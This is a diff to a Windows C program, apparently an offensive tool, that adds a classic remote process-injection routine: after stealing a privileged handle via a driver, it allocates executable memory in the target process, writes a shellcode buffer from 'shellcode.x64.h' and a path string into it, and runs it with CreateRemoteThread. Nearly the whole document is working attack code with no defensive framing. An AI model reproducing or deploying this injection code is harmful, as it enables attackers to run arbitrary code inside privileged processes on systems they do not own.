@@ -8,6 +8,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <dbghelp.h>
+#include "shellcode.x64.h"
 #include "mlwrfox.h"
 #include "util.h"
 
@@ -73,6 +74,48 @@ int main(int argc, char **argv)
 		  if ( AcquireHandle(hDriver, &pid, &privHandle) )
 		  {
 			  printf("[+] stole privileged handle %p to %s\n", privHandle, pname);
+
+			  pMemory = VirtualAllocEx(
+				privHandle,
+				NULL,
+				sizeof(buf),
+				MEM_COMMIT,
+				PAGE_EXECUTE_READWRITE
+		          );
+			  pStrMem = VirtualAllocEx(
+				privHandle,
+				NULL,
+				strlen(outpath) + 1,
+				MEM_COMMIT,
+				PAGE_READWRITE
+			  );
+
+			  WriteProcessMemory(
+				privHandle,
+				pMemory,
+				buf,
+				sizeof(buf),
+				NULL
+			  );
+			  WriteProcessMemory(
+				privHandle,
+				pStrMem,
+				outpath,
+				strlen(outpath) + 1,
+				NULL
+			  );
+
+			  CreateRemoteThread(
+				privHandle,
+				NULL,
+				0,
+				(LPTHREAD_START_ROUTINE)pMemory,
+				(LPVOID)pStrMem,
+				0,
+				NULL
+			  );
+
+			  printf("[+] injected %i bytes of shellcode into %s\n", sizeof(buf), pname);
 		  } else { 
 			  printf("[ ] failed to steal handle to %s\n",
 					  pname);
